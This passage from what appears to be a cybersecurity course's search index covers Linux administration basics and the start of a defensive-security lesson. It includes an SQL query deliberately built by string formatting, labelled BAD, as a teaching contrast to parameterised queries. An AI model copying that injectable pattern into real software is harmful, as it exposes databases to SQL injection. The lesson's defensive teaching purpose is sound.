groupadd developers # Create group with specific GID sudo groupadd -g 1001 developers Managing Groups # Add user to group sudo usermod -aG developers john # Remove user from group sudo gpasswd -d john developers # Delete group sudo groupdel developers # Show all groups cat /etc/group File System Management Mounting and Unmounting # Mount a device sudo mount /dev/sdb1 /mnt/usb # Unmount sudo umount /mnt/usb # Mount with specific filesystem type sudo mount -t ntfs /dev/sdb1 /mnt/windows # Show mounted filesystems mount # Show disk usage df -h /etc/fstab - Automatic Mounting Edit /etc/fstab to automatically mount filesystems at boot: sudo nano /etc/fstab Example entry: /dev/sdb1 /mnt/data ext4 defaults 0 2 Checking Disk Health # Check filesystem sudo fsck /dev/sdb1 # Check and repair sudo fsck -y /dev/sdb1 # SMART status (if installed) sudo smartctl -a /dev/sda Service Management (systemd) Modern Linux uses systemd to manage services. Managing Services # Start service sudo systemctl start apache2 # Stop service sudo systemctl stop apache2 # Restart service sudo systemctl restart apache2 # Reload configuration sudo systemctl reload apache2 # Enable service (start at boot) sudo systemctl enable apache2 # Disable service (don't start at boot) sudo systemctl disable apache2 # Check service status sudo systemctl status apache2 # Show if service is active systemctl is-active apache2 # Show if service is enabled systemctl is-enabled apache2 Viewing Services # List all services systemctl list-units --type=service # List enabled services systemctl list-unit-files --type=service --state=enabled # List failed services systemctl --failed Viewing Logs # View service logs sudo journalctl -u apache2 # Follow logs (real-time) sudo journalctl -u apache2 -f # View logs since boot sudo journalctl -b # View recent logs sudo journalctl -n 50 # View logs for specific time sudo journalctl --since \"2024-01-01\" --until \"2024-01-02\" System Logs Log Locations /var/log/syslog # General system log /var/log/auth.log # Authentication log /var/log/kern.log # Kernel log /var/log/apache2/ # Apache logs /var/log/mysql/ # MySQL logs Viewing Logs # View recent system log tail -f /var/log/syslog # View authentication attempts sudo tail -f /var/log/auth.log # Search for failed logins sudo grep \"Failed password\" /var/log/auth.log # Count failed login attempts sudo grep \"Failed password\" /var/log/auth.log | wc -l Scheduled Tasks (Cron) Cron runs commands on a schedule. Crontab Syntax * * * * * command \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500 Day of week (0-7, Sunday = 0 or 7) \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500 Month (1-12) \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Day of month (1-31) \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Hour (0-23) \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Minute (0-59) Managing Crontab # Edit current user's crontab crontab -e # List crontab crontab -l # Remove crontab crontab -r # Edit another user's crontab sudo crontab -u john -e Examples # Run every day at 2 AM 0 2 * * * /path/to/backup.sh # Run every hour 0 * * * * /path/to/check.sh # Run every 15 minutes */15 * * * * /path/to/script.sh # Run every Monday at 3 PM 0 15 * * 1 /path/to/weekly.sh # Run at reboot @reboot /path/to/startup.sh # Run daily @daily /path/to/daily.sh System-wide Cron # Edit system crontabs sudo vim /etc/crontab # Or place scripts in: /etc/cron.daily/ # Runs daily /etc/cron.hourly/ # Runs hourly /etc/cron.weekly/ # Runs weekly /etc/cron.monthly/ # Runs monthly System Monitoring Resource Monitoring # Real-time process monitor top # Better alternative (if installed) htop # Disk I/O statistics iostat # Virtual memory statistics vmstat # Network statistics netstat -tuln # Listening ports netstat -plant # All connections # Modern alternative to netstat ss -tuln # Listening ports ss -plant # All connections System Information # CPU information lscpu cat /proc/cpuinfo # Memory information free -h cat /proc/meminfo # Disk information lsblk fdisk -l # PCI devices lspci # USB devices lsusb # Kernel version uname -r # Distribution information cat /etc/os-release lsb_release -a Network Configuration Network Interfaces # Show interfaces (old) ifconfig # Show interfaces (modern) ip addr show ip a # Bring interface up sudo ip link set eth0 up # Bring interface down sudo ip link set eth0 down # Set IP address sudo ip addr add 192.168.1.100/24 dev eth0 # Delete IP address sudo ip addr del 192.168.1.100/24 dev eth0 Network Configuration Files /etc/network/interfaces (Debian) sudo nano /etc/network/interfaces Static IP example: auto eth0 iface eth0 inet static address 192.168.1.100 netmask 255.255.255.0 gateway 192.168.1.1 dns-nameservers 8.8.8.8 8.8.4.4 DHCP example: auto eth0 iface eth0 inet dhcp netplan (Ubuntu 18.04+) sudo nano /etc/netplan/01-netcfg.yaml Example: network: version: 2 ethernets: eth0: dhcp4: false addresses: [192.168.1.100/24] gateway4: 192.168.1.1 nameservers: addresses: [8.8.8.8, 8.8.4.4] Apply changes: sudo netplan apply DNS Configuration # Edit DNS servers sudo nano /etc/resolv.conf Example: nameserver 8.8.8.8 nameserver 8.8.4.4 Hostname # Show hostname hostname # Change hostname temporarily sudo hostname newhostname # Change hostname permanently sudo hostnamectl set-hostname newhostname # Edit hosts file sudo nano /etc/hosts Firewall (iptables/ufw) UFW (Uncomplicated Firewall) Easier to use than raw iptables. # Enable firewall sudo ufw enable # Disable firewall sudo ufw disable # Show status sudo ufw status # Verbose status sudo ufw status verbose # Allow port sudo ufw allow 22 sudo ufw allow 80/tcp sudo ufw allow 443/tcp # Allow from specific IP sudo ufw allow from 192.168.1.100 # Allow specific IP to specific port sudo ufw allow from 192.168.1.100 to any port 22 # Deny port sudo ufw deny 23 # Delete rule sudo ufw delete allow 80 # Reset firewall (remove all rules) sudo ufw reset # Set default policies sudo ufw default deny incoming sudo ufw default allow outgoing iptables (Advanced) Lower-level firewall control. # List rules sudo iptables -L # List with line numbers sudo iptables -L --line-numbers # Allow incoming SSH sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT # Allow established connections sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # Drop all other incoming sudo iptables -A INPUT -j DROP # Save rules (Debian/Ubuntu) sudo iptables-save > /etc/iptables/rules.v4 # Restore rules sudo iptables-restore < /etc/iptables/rules.v4 # Flush all rules sudo iptables -F System Updates and Security Keeping System Updated # Update and upgrade (Debian/Ubuntu) sudo apt update && sudo apt upgrade -y # Security updates only sudo apt update && sudo apt upgrade -y --only-upgrade # Automatic updates (install package) sudo apt install unattended-upgrades # Configure automatic updates sudo dpkg-reconfigure unattended-upgrades Security Hardening Basics # Disable root login via SSH sudo nano /etc/ssh/sshd_config # Set: PermitRootLogin no sudo systemctl restart sshd # Change SSH port (security through obscurity) # In /etc/ssh/sshd_config: Port 2222 # Disable password authentication (use keys only) # In /etc/ssh/sshd_config: PasswordAuthentication no # Install fail2ban (blocks repeated failed logins) sudo apt install fail2ban sudo systemctl enable fail2ban sudo systemctl start fail2ban Backups Using tar for Backups # Backup home directory sudo tar -czvf /backup/home-$(date +%Y%m%d).tar.gz /home # Restore from backup sudo tar -xzvf /backup/home-20240101.tar.gz -C / Using rsync for Backups # Backup to another location sudo rsync -avz /home /backup/ # Backup over network sudo rsync -avz /home user@remote:/backup/ # Exclude certain files sudo rsync -avz --exclude='*.tmp' /home /backup/ Practical Security Examples Check for Failed Login Attempts sudo grep \"Failed password\" /var/log/auth.log | tail -20 Find Recently Modified Files find /etc -mtime -1 # Modified in last 24 hours Check Listening Ports sudo ss -tuln sudo netstat -tuln See Active Connections sudo ss -plant sudo netstat -plant Check for Unusual Processes ps aux | grep -v \"\\[\" | grep -v \"root\" | sort -k 3 -r | head Monitor System Logs in Real-Time sudo tail -f /var/log/syslog | grep -i error Key Takeaways System administration skills you now have: - Package management (installing/removing software) - User and group management - Service management (starting/stopping/enabling services) - Log viewing and monitoring - Scheduled tasks (cron) - Network configuration - Basic firewall rules - System security hardening These are fundamental skills every security professional needs. You'll use these daily whether you're: - Setting up security tools - Investigating incidents - Hardening systems - Monitoring for threats - Analyzing logs Practice these commands regularly. Set up a virtual machine and experiment. Break things (in your VM!) and fix them. That's how you truly learn system administration. In the next lessons, we'll move beyond Linux basics and start applying these skills to security-specific scenarios.","title":"Lesson 1.6"},{"location":"LECTURES/unit1/lesson1-6/#package-management-and-system-administration","text":"Linux systems need software installation, updates, and maintenance. As a security professional, you'll constantly be installing tools, updating systems, and managing services. This lesson covers the essential system administration tasks.","title":"Package Management and System Administration"},{"location":"LECTURES/unit1/lesson1-6/#package-management","text":"Package managers handle software installation, updates, and removal. Different Linux distributions use different package managers.","title":"Package Management"},{"location":"LECTURES/unit1/lesson1-6/#apt-debianubuntukali","text":"APT (Advanced Package Tool) is used on Debian-based systems like Ubuntu and Kali Linux.","title":"APT (Debian/Ubuntu/Kali)"},{"location":"LECTURES/unit1/lesson1-6/#updating-package-lists","text":"# Update package index sudo apt update # Always do this before installing new software!","title":"Updating Package Lists"},{"location":"LECTURES/unit1/lesson1-6/#upgrading-packages","text":"# Upgrade all installed packages sudo apt upgrade # Upgrade with automatic handling of dependencies sudo apt full-upgrade # Upgrade specific package sudo apt upgrade package-name","title":"Upgrading Packages"},{"location":"LECTURES/unit1/lesson1-6/#installing-packages","text":"# Install package sudo apt install nmap # Install multiple packages sudo apt install nmap wireshark metasploit-framework # Install without confirmation sudo apt install -y nmap # Reinstall package sudo apt install --reinstall nmap","title":"Installing Packages"},{"location":"LECTURES/unit1/lesson1-6/#removing-packages","text":"# Remove package (keep configuration files) sudo apt remove nmap # Remove package and configuration files sudo apt purge nmap # Remove unused dependencies sudo apt autoremove # Clean up downloaded package files sudo apt clean","title":"Removing Packages"},{"location":"LECTURES/unit1/lesson1-6/#searching-for-packages","text":"# Search for package apt search nmap # Show package information apt show nmap # List installed packages apt list --installed # List upgradeable packages apt list --upgradeable","title":"Searching for Packages"},{"location":"LECTURES/unit1/lesson1-6/#yumdnf-red-hatfedoracentos","text":"Used on Red Hat-based systems. # Update package lists sudo yum update # or sudo dnf update # Install package sudo yum install nmap # Remove package sudo yum remove nmap # Search for package yum search nmap # Show package info yum info nmap","title":"YUM/DNF (Red Hat/Fedora/CentOS)"},{"location":"LECTURES/unit1/lesson1-6/#installing-from-source","text":"Sometimes you need to compile software from source code. # 1. Download source code wget https://example.com/software.tar.gz # 2. Extract tar -xzvf software.tar.gz cd software/ # 3. Configure ./configure # 4. Compile make # 5. Install sudo make install # 6. Uninstall (if needed) sudo make uninstall Common compilation dependencies: sudo apt install build-essential sudo apt install gcc g++ make","title":"Installing from Source"},{"location":"LECTURES/unit1/lesson1-6/#user-management","text":"","title":"User Management"},{"location":"LECTURES/unit1/lesson1-6/#creating-users","text":"# Create new user sudo useradd john # Create user with home directory sudo useradd -m john # Create user with specific shell sudo useradd -m -s /bin/bash john # Set password sudo passwd john","title":"Creating Users"},{"location":"LECTURES/unit1/lesson1-6/#modifying-users","text":"# Change user's shell sudo usermod -s /bin/zsh john # Add user to group sudo usermod -aG sudo john # Add to sudo group sudo usermod -aG docker john # Add to docker group # Change home directory sudo usermod -d /home/newjohn john # Lock user account sudo usermod -L john # Unlock user account sudo usermod -U john","title":"Modifying Users"},{"location":"LECTURES/unit1/lesson1-6/#deleting-users","text":"# Delete user (keep home directory) sudo userdel john # Delete user and home directory sudo userdel -r john","title":"Deleting Users"},{"location":"LECTURES/unit1/lesson1-6/#user-information","text":"# Show current user whoami # Show all users cat /etc/passwd # Show logged in users who # Show what users are doing w # Last logins last # Show user's groups groups username # Show user ID and group ID id username","title":"User Information"},{"location":"LECTURES/unit1/lesson1-6/#switching-users","text":"# Switch to another user su - john # Switch to root su - # Run command as another user sudo -u john command # Open shell as root sudo -i # Run command as root sudo command","title":"Switching Users"},{"location":"LECTURES/unit1/lesson1-6/#group-management","text":"","title":"Group Management"},{"location":"LECTURES/unit1/lesson1-6/#creating-groups","text":"# Create group sudo groupadd developers # Create group with specific GID sudo groupadd -g 1001 developers","title":"Creating Groups"},{"location":"LECTURES/unit1/lesson1-6/#managing-groups","text":"# Add user to group sudo usermod -aG developers john # Remove user from group sudo gpasswd -d john developers # Delete group sudo groupdel developers # Show all groups cat /etc/group","title":"Managing Groups"},{"location":"LECTURES/unit1/lesson1-6/#file-system-management","text":"","title":"File System Management"},{"location":"LECTURES/unit1/lesson1-6/#mounting-and-unmounting","text":"# Mount a device sudo mount /dev/sdb1 /mnt/usb # Unmount sudo umount /mnt/usb # Mount with specific filesystem type sudo mount -t ntfs /dev/sdb1 /mnt/windows # Show mounted filesystems mount # Show disk usage df -h","title":"Mounting and Unmounting"},{"location":"LECTURES/unit1/lesson1-6/#etcfstab-automatic-mounting","text":"Edit /etc/fstab to automatically mount filesystems at boot: sudo nano /etc/fstab Example entry: /dev/sdb1 /mnt/data ext4 defaults 0 2","title":"/etc/fstab - Automatic Mounting"},{"location":"LECTURES/unit1/lesson1-6/#checking-disk-health","text":"# Check filesystem sudo fsck /dev/sdb1 # Check and repair sudo fsck -y /dev/sdb1 # SMART status (if installed) sudo smartctl -a /dev/sda","title":"Checking Disk Health"},{"location":"LECTURES/unit1/lesson1-6/#service-management-systemd","text":"Modern Linux uses systemd to manage services.","title":"Service Management (systemd)"},{"location":"LECTURES/unit1/lesson1-6/#managing-services","text":"# Start service sudo systemctl start apache2 # Stop service sudo systemctl stop apache2 # Restart service sudo systemctl restart apache2 # Reload configuration sudo systemctl reload apache2 # Enable service (start at boot) sudo systemctl enable apache2 # Disable service (don't start at boot) sudo systemctl disable apache2 # Check service status sudo systemctl status apache2 # Show if service is active systemctl is-active apache2 # Show if service is enabled systemctl is-enabled apache2","title":"Managing Services"},{"location":"LECTURES/unit1/lesson1-6/#viewing-services","text":"# List all services systemctl list-units --type=service # List enabled services systemctl list-unit-files --type=service --state=enabled # List failed services systemctl --failed","title":"Viewing Services"},{"location":"LECTURES/unit1/lesson1-6/#viewing-logs","text":"# View service logs sudo journalctl -u apache2 # Follow logs (real-time) sudo journalctl -u apache2 -f # View logs since boot sudo journalctl -b # View recent logs sudo journalctl -n 50 # View logs for specific time sudo journalctl --since \"2024-01-01\" --until \"2024-01-02\"","title":"Viewing Logs"},{"location":"LECTURES/unit1/lesson1-6/#system-logs","text":"","title":"System Logs"},{"location":"LECTURES/unit1/lesson1-6/#log-locations","text":"/var/log/syslog # General system log /var/log/auth.log # Authentication log /var/log/kern.log # Kernel log /var/log/apache2/ # Apache logs /var/log/mysql/ # MySQL logs","title":"Log Locations"},{"location":"LECTURES/unit1/lesson1-6/#viewing-logs_1","text":"# View recent system log tail -f /var/log/syslog # View authentication attempts sudo tail -f /var/log/auth.log # Search for failed logins sudo grep \"Failed password\" /var/log/auth.log # Count failed login attempts sudo grep \"Failed password\" /var/log/auth.log | wc -l","title":"Viewing Logs"},{"location":"LECTURES/unit1/lesson1-6/#scheduled-tasks-cron","text":"Cron runs commands on a schedule.","title":"Scheduled Tasks (Cron)"},{"location":"LECTURES/unit1/lesson1-6/#crontab-syntax","text":"* * * * * command \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500 Day of week (0-7, Sunday = 0 or 7) \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500 Month (1-12) \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Day of month (1-31) \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Hour (0-23) \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Minute (0-59)","title":"Crontab Syntax"},{"location":"LECTURES/unit1/lesson1-6/#managing-crontab","text":"# Edit current user's crontab crontab -e # List crontab crontab -l # Remove crontab crontab -r # Edit another user's crontab sudo crontab -u john -e","title":"Managing Crontab"},{"location":"LECTURES/unit1/lesson1-6/#examples","text":"# Run every day at 2 AM 0 2 * * * /path/to/backup.sh # Run every hour 0 * * * * /path/to/check.sh # Run every 15 minutes */15 * * * * /path/to/script.sh # Run every Monday at 3 PM 0 15 * * 1 /path/to/weekly.sh # Run at reboot @reboot /path/to/startup.sh # Run daily @daily /path/to/daily.sh","title":"Examples"},{"location":"LECTURES/unit1/lesson1-6/#system-wide-cron","text":"# Edit system crontabs sudo vim /etc/crontab # Or place scripts in: /etc/cron.daily/ # Runs daily /etc/cron.hourly/ # Runs hourly /etc/cron.weekly/ # Runs weekly /etc/cron.monthly/ # Runs monthly","title":"System-wide Cron"},{"location":"LECTURES/unit1/lesson1-6/#system-monitoring","text":"","title":"System Monitoring"},{"location":"LECTURES/unit1/lesson1-6/#resource-monitoring","text":"# Real-time process monitor top # Better alternative (if installed) htop # Disk I/O statistics iostat # Virtual memory statistics vmstat # Network statistics netstat -tuln # Listening ports netstat -plant # All connections # Modern alternative to netstat ss -tuln # Listening ports ss -plant # All connections","title":"Resource Monitoring"},{"location":"LECTURES/unit1/lesson1-6/#system-information","text":"# CPU information lscpu cat /proc/cpuinfo # Memory information free -h cat /proc/meminfo # Disk information lsblk fdisk -l # PCI devices lspci # USB devices lsusb # Kernel version uname -r # Distribution information cat /etc/os-release lsb_release -a","title":"System Information"},{"location":"LECTURES/unit1/lesson1-6/#network-configuration","text":"","title":"Network Configuration"},{"location":"LECTURES/unit1/lesson1-6/#network-interfaces","text":"# Show interfaces (old) ifconfig # Show interfaces (modern) ip addr show ip a # Bring interface up sudo ip link set eth0 up # Bring interface down sudo ip link set eth0 down # Set IP address sudo ip addr add 192.168.1.100/24 dev eth0 # Delete IP address sudo ip addr del 192.168.1.100/24 dev eth0","title":"Network Interfaces"},{"location":"LECTURES/unit1/lesson1-6/#network-configuration-files","text":"","title":"Network Configuration Files"},{"location":"LECTURES/unit1/lesson1-6/#etcnetworkinterfaces-debian","text":"sudo nano /etc/network/interfaces Static IP example: auto eth0 iface eth0 inet static address 192.168.1.100 netmask 255.255.255.0 gateway 192.168.1.1 dns-nameservers 8.8.8.8 8.8.4.4 DHCP example: auto eth0 iface eth0 inet dhcp","title":"/etc/network/interfaces (Debian)"},{"location":"LECTURES/unit1/lesson1-6/#netplan-ubuntu-1804","text":"sudo nano /etc/netplan/01-netcfg.yaml Example: network: version: 2 ethernets: eth0: dhcp4: false addresses: [192.168.1.100/24] gateway4: 192.168.1.1 nameservers: addresses: [8.8.8.8, 8.8.4.4] Apply changes: sudo netplan apply","title":"netplan (Ubuntu 18.04+)"},{"location":"LECTURES/unit1/lesson1-6/#dns-configuration","text":"# Edit DNS servers sudo nano /etc/resolv.conf Example: nameserver 8.8.8.8 nameserver 8.8.4.4","title":"DNS Configuration"},{"location":"LECTURES/unit1/lesson1-6/#hostname","text":"# Show hostname hostname # Change hostname temporarily sudo hostname newhostname # Change hostname permanently sudo hostnamectl set-hostname newhostname # Edit hosts file sudo nano /etc/hosts","title":"Hostname"},{"location":"LECTURES/unit1/lesson1-6/#firewall-iptablesufw","text":"","title":"Firewall (iptables/ufw)"},{"location":"LECTURES/unit1/lesson1-6/#ufw-uncomplicated-firewall","text":"Easier to use than raw iptables. # Enable firewall sudo ufw enable # Disable firewall sudo ufw disable # Show status sudo ufw status # Verbose status sudo ufw status verbose # Allow port sudo ufw allow 22 sudo ufw allow 80/tcp sudo ufw allow 443/tcp # Allow from specific IP sudo ufw allow from 192.168.1.100 # Allow specific IP to specific port sudo ufw allow from 192.168.1.100 to any port 22 # Deny port sudo ufw deny 23 # Delete rule sudo ufw delete allow 80 # Reset firewall (remove all rules) sudo ufw reset # Set default policies sudo ufw default deny incoming sudo ufw default allow outgoing","title":"UFW (Uncomplicated Firewall)"},{"location":"LECTURES/unit1/lesson1-6/#iptables-advanced","text":"Lower-level firewall control. # List rules sudo iptables -L # List with line numbers sudo iptables -L --line-numbers # Allow incoming SSH sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT # Allow established connections sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # Drop all other incoming sudo iptables -A INPUT -j DROP # Save rules (Debian/Ubuntu) sudo iptables-save > /etc/iptables/rules.v4 # Restore rules sudo iptables-restore < /etc/iptables/rules.v4 # Flush all rules sudo iptables -F","title":"iptables (Advanced)"},{"location":"LECTURES/unit1/lesson1-6/#system-updates-and-security","text":"","title":"System Updates and Security"},{"location":"LECTURES/unit1/lesson1-6/#keeping-system-updated","text":"# Update and upgrade (Debian/Ubuntu) sudo apt update && sudo apt upgrade -y # Security updates only sudo apt update && sudo apt upgrade -y --only-upgrade # Automatic updates (install package) sudo apt install unattended-upgrades # Configure automatic updates sudo dpkg-reconfigure unattended-upgrades","title":"Keeping System Updated"},{"location":"LECTURES/unit1/lesson1-6/#security-hardening-basics","text":"# Disable root login via SSH sudo nano /etc/ssh/sshd_config # Set: PermitRootLogin no sudo systemctl restart sshd # Change SSH port (security through obscurity) # In /etc/ssh/sshd_config: Port 2222 # Disable password authentication (use keys only) # In /etc/ssh/sshd_config: PasswordAuthentication no # Install fail2ban (blocks repeated failed logins) sudo apt install fail2ban sudo systemctl enable fail2ban sudo systemctl start fail2ban","title":"Security Hardening Basics"},{"location":"LECTURES/unit1/lesson1-6/#backups","text":"","title":"Backups"},{"location":"LECTURES/unit1/lesson1-6/#using-tar-for-backups","text":"# Backup home directory sudo tar -czvf /backup/home-$(date +%Y%m%d).tar.gz /home # Restore from backup sudo tar -xzvf /backup/home-20240101.tar.gz -C /","title":"Using tar for Backups"},{"location":"LECTURES/unit1/lesson1-6/#using-rsync-for-backups","text":"# Backup to another location sudo rsync -avz /home /backup/ # Backup over network sudo rsync -avz /home user@remote:/backup/ # Exclude certain files sudo rsync -avz --exclude='*.tmp' /home /backup/","title":"Using rsync for Backups"},{"location":"LECTURES/unit1/lesson1-6/#practical-security-examples","text":"","title":"Practical Security Examples"},{"location":"LECTURES/unit1/lesson1-6/#check-for-failed-login-attempts","text":"sudo grep \"Failed password\" /var/log/auth.log | tail -20","title":"Check for Failed Login Attempts"},{"location":"LECTURES/unit1/lesson1-6/#find-recently-modified-files","text":"find /etc -mtime -1 # Modified in last 24 hours","title":"Find Recently Modified Files"},{"location":"LECTURES/unit1/lesson1-6/#check-listening-ports","text":"sudo ss -tuln sudo netstat -tuln","title":"Check Listening Ports"},{"location":"LECTURES/unit1/lesson1-6/#see-active-connections","text":"sudo ss -plant sudo netstat -plant","title":"See Active Connections"},{"location":"LECTURES/unit1/lesson1-6/#check-for-unusual-processes","text":"ps aux | grep -v \"\\[\" | grep -v \"root\" | sort -k 3 -r | head","title":"Check for Unusual Processes"},{"location":"LECTURES/unit1/lesson1-6/#monitor-system-logs-in-real-time","text":"sudo tail -f /var/log/syslog | grep -i error","title":"Monitor System Logs in Real-Time"},{"location":"LECTURES/unit1/lesson1-6/#key-takeaways","text":"System administration skills you now have: - Package management (installing/removing software) - User and group management - Service management (starting/stopping/enabling services) - Log viewing and monitoring - Scheduled tasks (cron) - Network configuration - Basic firewall rules - System security hardening These are fundamental skills every security professional needs. You'll use these daily whether you're: - Setting up security tools - Investigating incidents - Hardening systems - Monitoring for threats - Analyzing logs Practice these commands regularly. Set up a virtual machine and experiment. Break things (in your VM!) and fix them. That's how you truly learn system administration. In the next lessons, we'll move beyond Linux basics and start applying these skills to security-specific scenarios.","title":"Key Takeaways"},{"location":"LECTURES/unit10/lesson10-1/","text":"How Do We Protect Against This? (Protection & Prevention) You've learned how attacks work. Now let's talk about defense. This is where theory meets practice\u2014implementing security controls that actually protect systems and data. Defense is harder than offense, but with the right strategies and tools, it's achievable. Defense in Depth The fundamental principle: never rely on a single security control . Layer multiple defenses so if one fails, others still protect you. Think of a medieval castle: - Moat (perimeter defense) - Outer walls (firewall) - Inner walls (network segmentation) - Guards (monitoring) - Vault (encryption) - Drawbridge (access control) Multiple obstacles make successful attack much harder. Apply to IT: - Network firewall - IDS/IPS - Endpoint protection - Access controls - Encryption - Security monitoring - User training - Incident response plans If attackers bypass the firewall, they still face IDS, endpoint protection, monitoring, etc. Security Frameworks Organizations use security frameworks to structure their defense: NIST Cybersecurity Framework Five core functions: 1. Identify - Asset management (know what you have) - Risk assessment - Governance 2. Protect - Access control - Data security - Security training - Protective technology 3. Detect - Monitoring - Anomaly detection - Security events 4. Respond - Response planning - Communication - Analysis - Mitigation - Improvements 5. Recover - Recovery planning - Improvements - Communication ISO 27001/27002 International standards for information security management. Domains: - Security policy - Organization of information security - Asset management - Access control - Cryptography - Physical security - Operations security - Communications security - System development security - Supplier relationships - Incident management - Business continuity - Compliance CIS Controls Center for Internet Security Critical Security Controls \u2014prioritized, actionable defenses: Basic Controls (do these first): 1. Inventory and control of hardware assets 2. Inventory and control of software assets 3. Continuous vulnerability management 4. Controlled use of administrative privileges 5. Secure configuration for hardware and software 6. Maintenance, monitoring, and analysis of audit logs Foundational Controls: 7-16 (email security, malware defenses, data recovery, etc.) Organizational Controls: 17-20 (incident response, penetration testing, etc.) Network Security Firewalls (Revisited) Implementation best practices: Default deny : Block everything, explicitly allow only what's needed # Bad: Allow everything except specific blocks # Good: Block everything except specific allows Least privilege : Only allow minimum necessary access Rule ordering matters : More specific rules first 1. Allow 192.168.1.50:443 to any (specific) 2. Block 192.168.1.0/24 to any (general) Regular review : Remove unused rules, ensure rules still needed Stateful inspection : Track connection state, not just individual packets Application-level filtering : Inspect actual content, not just headers Intrusion Detection/Prevention Systems Signature-based detection: - Matches known attack patterns - Fast and accurate for known threats - Can't detect new attacks Anomaly-based detection: - Establishes baseline of normal behavior - Detects deviations - Can find zero-day attacks - Higher false positive rate Behavioral analysis: - Looks for suspicious behaviors (port scanning, failed logins) - Useful for insider threats Deployment: - Inline (IPS) : Can block attacks, but adds latency - Out-of-band (IDS) : Monitor-only, no impact on traffic flow Tuning is critical: - Too sensitive \u2192 false positives, alert fatigue - Too permissive \u2192 miss real attacks - Continuous tuning based on environment Network Segmentation Microsegmentation : Divide network into small zones Implementation: - VLANs for logical separation - Firewalls between segments - Zero Trust principles Example segmentation: [Internet] \u2193 [DMZ] - Public web servers \u2193 [Firewall] \u2193 [Internal Network] \u251c\u2500 [Employee Network] \u251c\u2500 [Server Network] \u251c\u2500 [Development Network] \u2514\u2500 [IoT/Guest Network] Each segment has appropriate controls and isolation. Network Access Control (NAC) Pre-connection checks: 1. Device identification 2. Authentication 3. Compliance check (OS patches, antivirus updated) 4. Authorization (what can you access?) Enforcement: - Full access (compliant, authorized) - Quarantine (needs updates) - Guest access (untrusted devices) - Denied (failed checks) 802.1X : Port-based network access control - User/device authentication before network access - RADIUS server validates credentials - Switch grants or denies access Endpoint Security Endpoints (desktops, laptops, servers, mobile devices) are common attack targets. Antivirus / Anti-Malware Traditional antivirus: - Signature-based detection - Effective against known malware - Signature database must be updated Next-gen antivirus (NGAV): - Machine learning - Behavioral analysis - Cloud-based threat intelligence - Can detect unknown malware Endpoint Detection and Response (EDR): - Continuous monitoring - Threat detection - Investigation capabilities - Automated response - Forensics data Host-Based Firewall Software firewall on individual systems. Benefits: - Controls traffic to/from specific applications - Last line of defense - Protects even on untrusted networks Configuration: # Linux (iptables example) iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -j DROP # Default deny # Windows New-NetFirewallRule -DisplayName \"Allow SSH\" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow Application Whitelisting Only approved applications can run. Benefits: - Prevents unauthorized software execution - Stops most malware - Reduces attack surface Challenges: - Management overhead - User resistance - Needs accurate software inventory Tools: Windows AppLocker, Carbon Black, bit9 Patch Management Unpatched systems are low-hanging fruit for attackers. Process: 1. Inventory all systems and software 2. Monitor for new patches 3. Test patches in non-production 4. Deploy in stages 5. Verify successful installation 6. Document exceptions Prioritization: - Critical systems first - Publicly known vulnerabilities - Exploits in the wild - CVSS severity scores Challenges: - Patch compatibility issues - Downtime for patching - Legacy systems that can't be patched Virtual patching : IPS rules that protect unpatched systems Application Security Secure Development Lifecycle (SDL) Security integrated into development process: Requirements phase: - Define security requirements - Threat modeling Design phase: - Security architecture - Review design for vulnerabilities Implementation phase: - Secure coding practices - Code review - Static analysis Testing phase: - Security testing - Penetration testing - Dynamic analysis Deployment phase: - Secure configuration - Hardening Maintenance phase: - Patch management - Monitoring - Incident response Input Validation Never trust user input. Whitelist validation (preferred): # Good: Only allow expected characters import re if re.match(r'^[a-zA-Z0-9_]{3,20}$', username): # Process username else: # Reject Blacklist validation (less secure): # Bad: Try to block malicious input # Attackers find ways around blacklists Validation rules: - Type (string, integer, email) - Length (min/max) - Format (regex pattern) - Range (numerical bounds) - Charset (allowed characters) Sanitization: import html safe_output = html.escape(user_input) # Prevents XSS Parameterized Queries Prevents SQL injection: Vulnerable: # BAD query = f\"SELECT * FROM users WHERE id = {user_id}\" cursor.execute(query) Secure: # GOOD query = \"SELECT * FROM users WHERE id = ?\" cursor.execute(query, (user_id,)) The database properly handles user input, preventing injection. Output Encoding Prevents XSS: # Encode for HTML context safe_html = html.escape(user_data) # Encode for JavaScript context safe_js = json.dumps(user_data) # Encode for URL context safe_url = urllib.parse.quote(user_data) Context-appropriate encoding is crucial. Web Application Firewall (WAF) Filters HTTP/HTTPS traffic to web applications. Protection against: - SQL injection - XSS - CSRF - File inclusion - DDoS Modes: - Blacklist (negative security): Block known attacks - Whitelist (positive security): Allow only known good traffic Popular WAFs: - ModSecurity (open-source) - Cloudflare WAF - AWS WAF - Azure WAF - Imperva Security Headers HTTP response headers that enhance security: Content-Security-Policy: default-src 'self' X-Frame-Options: DENY X-Content-Type-Options: nosniff Strict-Transport-Security: max-age=31536000 X-XSS-Protection: 1; mode=block Referrer-Policy: no-referrer Benefits: - Prevent clickjacking - Enforce HTTPS - Mitigate XSS - Control resource loading Access Control Authentication Password security: - Minimum length (12+ characters) - Complexity requirements - Password history (prevent reuse) - Expiration policies (controversial) - Account lockout after failed attempts - Password managers encouraged Multi-Factor Authentication (MFA): Require multiple factors: Something you know (password) + Something you have (phone, token) + Something you are (biometric) MFA methods: - SMS codes (weak, vulnerable to SIM swapping) 